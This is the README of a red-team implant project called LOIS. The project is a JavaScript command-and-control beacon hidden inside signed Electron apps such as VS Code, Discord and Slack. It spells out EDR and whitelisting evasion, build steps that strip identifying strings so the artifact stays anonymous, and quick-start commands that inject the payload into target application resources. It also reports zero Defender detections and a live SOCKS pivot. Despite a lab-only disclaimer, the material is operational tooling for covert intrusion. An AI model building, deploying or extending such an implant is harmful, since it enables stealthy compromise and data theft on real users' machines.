# LOIS

A pure-JavaScript Adaptix beacon that lives inside trusted, signed Electron
applications — built for environments where DLL whitelisting (Airlock) and
CrowdStrike-class EDR make PE/shellcode delivery a losing game.

Thesis (c0rnbread "play a different game", Loki lineage): modern EDR keys on
shellcode telemetry — injection, unbacked RWX, reflective loads, unsigned PEs.
A JavaScript implant running in the main process of a legitimately signed
Electron app produces none of it: no new PE on disk, no new DLL loads (the
default build is pure JS — no native addon, which is exactly what Airlock
would block), no injection. The payload is a single text file, obfuscatable
with standard JS tooling.

> Authorized lab use only. See the team's rules of engagement.

## What it is

- `src/` — the commented, human-readable agent source (**never shipped**).
  Speaks the stock Adaptix `beacon_listener_http` wire protocol byte-exactly
  (ported from the canonical beacon sources, not third-party rewrites):
  BE `Packer` beat + RC4(encrypt_key) in the hb header, LE task stream /
  BE result stream RC4'd with the session key, response template splicing.
- `scripts/` — build + delivery tooling (run on the operator machine):
  - `build_payload.js` — zero-dep bundler + hygiene transforms (below)
  - `asar.js` — zero-dep ASAR read/write/verify (SHA256 block integrity)
  - `inject_asar.js` — repack hook for **unfused** apps (VS Code class)
  - `inject_unpacked.js` — `app.asar.unpacked` script-jack for **fused** apps
    (Discord/Slack class)
- `test/` — `mock_listener.js` (protocol-exact stub server) + `run_tests.js`
- `dist/` — built artifacts (the ONLY thing that touches a target)

## Target hard rules (enforced by tests)

The shipped artifact must be anonymous: build strips ALL comments, physically
removes dev `log()` lines, and renames every telltale token
(`__LOIS_BAKED__`, `LOIS_` env prefix, sidecar name) per build. The suite
greps the artifact for a denylist (lois/beacon/adaptix/implant/inject/…) and
fails the build if any survive. When editing `src/`, keep the style rules:
comments are fine, but never put `//` inside a string literal on a code line,
keep every `log(...)` on one line, and avoid denylist words in identifiers
and strings.

## Quick start (lab)

```bash
export PATH=/projects/tools/node/bin:$PATH   # self-contained node 22
npm test                                     # protocol + hygiene + round-trip (18 tests)
node scripts/gen_profile.js --op ops/example.json     # op pack: listener + bake + nginx gate
node scripts/build_payload.js --bake ops/<op>/bake.json --name support
node scripts/recon.js --app "C:\...\TargetApp"        # fuse/route assessment first
# loose-file or fused app (validated route — see docs/targets/):
node scripts/inject_unpacked.js --app "C:\...\resources" --payload dist/support.js \
     --name support --target app/out/main.js
# classic unfused asar app (older layouts):
node scripts/inject_asar.js --app "C:\...\resources\app.asar" --payload dist/support.js --name support
```

Any `node >= 18` runs the bundle directly for dev (`node dist/bundle.js` with
`--fixed-tokens` builds accept `LW_*` env overrides); injected mode needs no
env at all (baked config, optionally encrypted — 004).

Docs: `docs/opsec.md` (read before prod), `docs/runbook.md` (re-injection),
`docs/targets/` (verified per-app profiles). Ops gate: `scripts/gate_mde.sh`.


## Roadmap

- [x] v0.1 core: registration, sleep/jitter, terminate, pwd/cd/ls/cat/rm/mkdir,
      disks, ps list/kill, chunked download/upload, profile task
- [x] stock listener e2e on the test rig (beacon_listener_http + MDE box) —
      2026-09-23: register/pwd/ls/mkdir verified vs `loistest` on AdaptixTest
      from DT-MDE-TEST (Code.exe, ELECTRON_RUN_AS_NODE, WMI-spawned so it
      survives ssh teardown); zero MDE detections. Note: REST tasking needs
      `"ui": false` — `ui: true` turns tasks into TASK_TYPE_BROWSER which is
      deliberately silent (no console/task-list persistence).
- [x] NaX HTTP channel transport (opsec upgrade over stock BeaconHTTP) —
      ticket 014 (done 2026-09-24: full channel incl. PROFILE apply + jquery
      profile live vs testhttp2 from DT-MDE-TEST, MDE clean)
- [x] SOCKS5 pivot over the tunnel channel — ticket 015 (done 2026-09-23:
      connect/write/pause/resume/close, live pivot through an MDE-box beacon)
- [ ] ELECTRON_RUN_AS_NODE launcher-persistence helper — ticket 017
      (SKIPPED 2026-09-24, operator decision)
- [ ] optional COFF/BOF addon — ticket 016 (SKIPPED 2026-09-24, operator
      decision: BOFs via the NaX beacon instead)
- [ ] `node_agent`-style teamserver extender — ticket 018 (SKIPPED
      2026-09-24, operator decision: local builds stay)

Opsec hardening plan (CS prod): see `tickets/README.md` (001–013).
